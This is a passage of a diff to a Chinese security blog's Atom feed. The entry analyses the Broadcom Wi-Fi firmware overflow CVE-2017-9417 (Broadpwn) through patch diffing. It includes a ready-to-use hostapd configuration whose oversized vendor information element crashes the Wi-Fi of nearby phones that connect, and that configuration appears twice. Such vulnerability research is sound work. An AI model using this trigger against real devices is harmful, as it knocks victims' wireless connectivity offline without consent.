第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
+<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
+<ol>
+<li>下载hostapd到ubuntu 14.04</li>
+<li>解压hostapd</li>
+<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
+<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
+<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
+<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
+<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
+    
+    </summary>
+    
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
+    
+      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
+    
+  </entry>
+  
+  <entry>
     <title>BROADCOM WI-FI芯片漏洞分析一</title>
     <link href="http://www.future-sec.com/broadcom-wifi-1.html"/>
     <id>http://www.future-sec.com/broadcom-wifi-1.html</id>
@@ -493,50 +537,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Android Wi-Fi驱动一直是众多安全研究员关注的重点，Android Wi-Fi驱动中曾经被发现大量root提权漏洞。 但这些漏洞都
-    
-    </summary>
-    
-      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Poc" scheme="http://www.future-sec.com/tags/Poc/"/>
-    
-      <category term="BROADCOM WI-FI" scheme="http://www.future-sec.com/tags/BROADCOM-WI-FI/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BROADCOM WI-FI芯片漏洞分析二</title>
-    <link href="http://www.future-sec.com/broadcom-wifi-2.html"/>
-    <id>http://www.future-sec.com/broadcom-wifi-2.html</id>
-    <published>2017-08-29T16:00:00.000Z</published>
-    <updated>2017-12-21T07:33:35.154Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。<br>1、首先是定位到帧提取函数<br>2、这个定位方式根据Project Zero的提示参考到bcm_parse_tlvs源码，然后在这部分源码中找到明显字符串，这里我找到的是“%04”，在rom.bin中字符串参考可以找到字符串位置。然后仔细看上下一些函数就能找到我们需要的bcm_parse_tlvs函数。上篇文章已经给出了具体伪代码示例。这里就不再赘述。<br>3、定位到函数之后我们可以根据Project Zero 提供的高级逻辑在ida中定位到相关位置。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">uint8_t* buffer = malloc(<span class="number">256</span>);</div><div class="line">uint8_t* pos = buffer;</div><div class="line"><span class="comment">//Copying the initial (static) information</span></div><div class="line">uint8_t* linkid_ie = bcm_parse_tlvs(..., <span class="number">101</span>);</div><div class="line">memcpy(pos, linkid_ie + <span class="number">0x8</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;   <span class="comment">//Initiator MAC</span></div><div class="line">memcpy(pos, linkid_ie + <span class="number">0xE</span>, <span class="number">0x6</span>);  pos += <span class="number">0x6</span>;    <span class="comment">//Responder MAC</span></div><div class="line">*pos = transaction_seq;             pos++;                   <span class="comment">//TransactionSeq</span></div><div class="line">memcpy(pos, linkid_ie, <span class="number">0x14</span>);       pos += <span class="number">0x14</span>;             <span class="comment">//LinkID-IE</span></div><div class="line"><span class="comment">//Copying the RSN IE</span></div><div class="line">uint8_t* rsn_ie = bcm_parse_tlvs(..., <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (rsn_ie[<span class="number">1</span>] + <span class="number">2</span> + (pos - buffer) &gt; <span class="number">0xFF</span>) &#123;</div><div class="line">    ... <span class="comment">//Handle overflow</span></div><div class="line">&#125;</div><div class="line">memcpy(pos, rsn_ie, rsn_ie[<span class="number">1</span>] + <span class="number">2</span>); pos += rsn_ie[<span class="number">1</span>] + <span class="number">2</span>;    <span class="comment">//RSN-IE</span></div><div class="line"><span class="comment">//Copying the remaining IEs</span></div><div class="line">uint8_t* timeout_ie = bcm_parse_tlvs(..., <span class="number">56</span>);</div><div class="line">uint8_t* ft_ie      = bcm_parse_tlvs(..., <span class="number">55</span>);</div><div class="line">memcpy(pos, timeout_ie, <span class="number">0x7</span>);       pos += <span class="number">0x7</span>;              <span class="comment">//Timeout Interval IE</span></div><div class="line">memcpy(pos, ft_ie, <span class="number">0x54</span>);           pos += <span class="number">0x54</span>;             <span class="comment">//Fast-Transition IE</span></div></pre></td></tr></table></figure></p>
-<p>到这里就不再继续解释了。如果还有地方不清楚可以提出疑问。</p>
-<h2 id="切入主题"><a href="#切入主题" class="headerlink" title="切入主题"></a>切入主题</h2><p>1、本篇文章主要核心是侧重CVE-2017-9417的漏洞分析和利用。<br>2、涉及到的相关知识将以链接形式详细给出</p>
-<h2 id="CVE-2017-9417漏洞分析"><a href="#CVE-2017-9417漏洞分析" class="headerlink" title="CVE-2017-9417漏洞分析"></a>CVE-2017-9417漏洞分析</h2><h3 id="分析ROM固件找到漏洞"><a href="#分析ROM固件找到漏洞" class="headerlink" title="分析ROM固件找到漏洞"></a>分析ROM固件找到漏洞</h3><p>1、一种方式是七月分打过补丁的Rom固件跟六月份没打补丁的利用 BinDiff （安装到IDA目录下在IDA中以插件形式执行，Crtl+6使用）对比，看修改了哪个补丁。最后可以找到漏洞函数wlc_bss_parse_wme_ie。这个函数用来处理关联、重新关联和信标包。这些信标包包含信息元素，包含Wi-Fi标准扩展的数据。每个信息元素（IE）的格式是：<br>type (1 byte), length (1 byte), data of (length) bytes<br>2、这个函数功能用来处理服务质量扩展的WME信息元素。下图是WME信息元素的格式：<br><img src="/images/wifi6.png" alt="img"><br>3、定位漏洞函数<br>·    bindiff对比6月份补丁跟7月份补丁的差异<br>·    第一步：将两个补丁版本都dump下来。<br>·    第二步：安装bindiff 到 ida 目录。安装方式，这里提供windows下安装包bindiff<br>·    第三步：先用ida打开7月份补丁，分析固件补丁时要注意它在内存中的存储位置，在上篇文章中我们提到ram在安卓系统内存中加载起始地址在0x180000.所以我们需要在ida加载时手动设置加载起始位置。并将分析好的数据保存数据库idb文件来方便我们跟6月份版本做对比。具体配置如下：<br><img src="/images/wifi7.png" alt="img"><br><img src="/images/wifi8.png" alt="img"><br>·    第四步：同样方式打开6月份补丁文件，Crtl+6启动bindiff插件，选择我们上一步保存的idb文件，可以对比分析两个版本有什么不同。<br>    跟踪到造成漏洞的函数。<br> <img src="/images/wifi9.png" alt="img"><br><img src="/images/wifi10.png" alt="img">   </p>
-<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>·该函数在关联/重新关联响应帧部分出现bug，它将接收到的ie复制到24（0x18）字节长的预分配缓冲区，大小适合最大的有效WME信息元素长度，但是使用信息元素头的长度可以高达255（0xff），创建一个堆在外边界写入231个字节，可造成溢出。 分析wlc_bss_parse_wme_ie漏洞函数。<br>assocresp_ies数据<br><img src="/images/wifi11.png" alt="img"><br>分析数据包信息大致理解关联帧IE的0x0c头部信息暂时理解为特定供应商标签。<br><img src="/images/wifi12.png" alt="img"><br>如下图比较可以看到修补bug前，没有对wme大小进行校验直接拷贝到预分配的缓冲区。<br><img src="/images/wifi13.png" alt="img"><br>缓冲区分配ida中参考在<a href="http://note.youdao.com/noteshare?id=7cb193be6f06643ef49f5f780bdb78c9" rel="external nofollow noopener noreferrer" target="_blank">这里</a></p>
-<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h3><p>这个bug很容易复现，因为最新版的Hostapd 支持自定义信息元素。<br>hostapd 安装：链接</p>
-<ol>
-<li>下载hostapd到ubuntu 14.04</li>
-<li>解压hostapd</li>
-<li>配置hostapd，使它编译为支持nl80211驱动<br>cp defconfig .config<br>vi .config #找到“#CONFIG_DRIVER_NL80211=y”，去掉“#”符号。保存。</li>
-<li>make #编译hostapd ，编译过程会报错，是因为缺少libnl库<br><img src="/images/wifi14.png" alt="img"><br>解决方法：下载并编译安装libnl 可以到主页下载：<a href="http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：" rel="external nofollow noopener noreferrer" target="_blank">http://www.infradead.org/~tgr/libnl/，也可以使用Git下载：</a><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> git:<span class="comment">//github.com/tgraf/libnl-1.1-stable.git</span></div><div class="line">cd libnl<span class="number">-1.1</span>-stable</div><div class="line">./configure</div><div class="line">make</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>5、make编译<br><img src="/images/wifi15.png" alt="img"><br>在启动hostapd时指定配置文件<br>1、新建配置文件 在/etc/目录新建一个文件hostapd.conf<br>2、配置文件内容<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"># WiFi Hotspot</div><div class="line">interface=wlan0</div><div class="line">driver=nl80211</div><div class="line">#Access Point</div><div class="line">ssid=YourNetworkNameHere</div><div class="line">hw_mode=g</div><div class="line"># WiFi Channel:</div><div class="line">channel=1</div><div class="line">macaddr_acl=0</div><div class="line">auth_algs=1</div><div class="line">ignore_broadcast_ssid=0</div><div class="line"></div><div class="line">assocresp_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div><div class="line">vendor_elements=ddff0050f2020101000003a4000027a4000042435e0062322f00414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141</div></pre></td></tr></table></figure></p>
-<p>1.interface：接入点设备名称，注意不要包含ap后缀，即如果该设备称为wlan0ap，填写wlan0即可；<br>2.driver：设定无线驱动，我这里是nl80211；<br>3.ssid: 设置名字(SSID = service set identifier) ,老版本(iwconfig)叫”essid”.<br>4.hw_mode: 设置操作mode,channels.有效的值取决于硬件,通常:a, b, g. ‘g’大多数都支持, 并向前兼容802.11b<br>5.channel:设置hostapd操作的channel.<br>6.ignore_broadcast_ssid: 开启或禁用广播ssid.<br>7.macaddr_acl: MAC地址过滤. .<br>8.auth_algs: 指定采用哪种认证算法，采用位域（bit fields）方式来制定，其中第一位表示开放系统认证（Open System Authentication, OSA），第二位表示共享密钥认证（Shared Key Authentication, SKA）。我这里设置alth_algs的值为1，表示只采用OSA；如果为3则两种认证方式都支持。 9.assocresp_elements:关联响应帧的附加供应商特定信息（翻译过来中文参考，不确定是否正确） 10.vendor_elements：信标和探测响应帧的附加供应商特定元素（翻译过来中文参考，不确定是否正确）<br>3、启动 hostpad<br>1.启动<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
-<p>2.启动过程如果出现“Interface wlan0 wasn’t started”错误，先运行下面2行命令<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo nmcli nm wifi off</div><div class="line">sudo rfkill unblock wlan</div></pre></td></tr></table></figure></p>
-<p>然后继续执行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo ./hostapd -B /etc/hostapd.conf</div></pre></td></tr></table></figure></p>
-<p>3.目标手机连上指定开启的wifi名称为“YourNetworkNameHere”的wifi，即可看到漏洞被触发，wifi重启。</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>前面已经了解了漏洞的成因，和简单复现了漏洞。接下来我们要做的是利用漏洞做些事情。后续继续分析将详细给出exploit的编写方法。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>1、Ubuntu上编译hostapd：<a href="http://blog.csdn.net/hnllc2012/article/details/49151137" rel="external nofollow noopener noreferrer" target="_blank">http://blog.csdn.net/hnllc2012/article/details/49151137</a><br>2、博客参考：<a href="http://boosterok.com/blog/broadpwn1/" rel="external nofollow noopener noreferrer" target="_blank">http://boosterok.com/blog/broadpwn1/</a></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上一篇文章写过之后又修改了一部分内容，加了很多细节。不过还有一点没有详细说明，具体怎么定位到漏洞函数。这里再进行定位流程详细梳理。&lt;br&gt;1
     
     </summary>
     
